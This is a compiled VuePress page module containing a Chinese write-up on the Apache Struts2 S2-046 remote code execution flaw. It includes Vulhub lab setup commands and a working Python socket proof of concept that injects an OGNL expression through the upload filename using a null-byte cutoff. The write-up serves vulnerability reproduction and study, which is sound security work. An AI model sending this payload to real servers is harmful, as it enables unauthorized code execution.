import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as p,c as i,a as n,b as s,d as e,e as c}from"./app-58e4a7d6.js";const l={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"漏洞详情:",-1),d={href:"https://cwiki.apache.org/confluence/display/WW/S2-046",target:"_blank",rel:"noopener noreferrer"},k={href:"https://xz.aliyun.com/t/221",target:"_blank",rel:"noopener noreferrer"},m=c(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行以下命令启动s2-046测试环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose build
docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>即可看到上传页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>与s2-045类似，但是输入点在文件上传的filename值位置，并需要使用<code>\\x00</code>截断。</p><p>由于需要发送畸形数据包，我们简单使用原生socket编写payload：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> socket

q <span class="token operator">=</span> <span class="token triple-quoted-string string">b&#39;&#39;&#39;------WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;%{#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;X-Test&#39;,233*233)}\\x00b&quot;
Content-Type: text/plain

foo
------WebKitFormBoundaryXd004BVJN9pBYBL2--&#39;&#39;&#39;</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b&#39;\\n&#39;</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\r\\n&#39;</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> <span class="token triple-quoted-string string">b&#39;&#39;&#39;POST / HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Length: %d

&#39;&#39;&#39;</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b&#39;\\n&#39;</span><span class="token punctuation">,</span> <span class="token string">b&#39;\\r\\n&#39;</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">)</span>

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>create_connection<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">&#39;your-ip&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;8080&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>
    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p <span class="token operator">+</span> q<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10240</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>233*233</code>已成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021120362.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>详情参考《Struts2 S2-045 远程代码执行漏洞 CVE-2017-5638》中的漏洞EXP。</p>`,14);function h(v,b){const a=o("ExternalLinkIcon");return p(),i("div",null,[r,u,n("ul",null,[n("li",null,[n("a",d,[s("https://cwiki.apache.org/confluence/display/WW/S2-046"),e(a)])]),n("li",null,[n("a",k,[s("https://xz.aliyun.com/t/221"),e(a)])])]),m])}const f=t(l,[["render",h],["__file","Struts2 S2-046 远程代码执行漏洞 CVE-2017-5638.html.vue"]]);export{f as default};
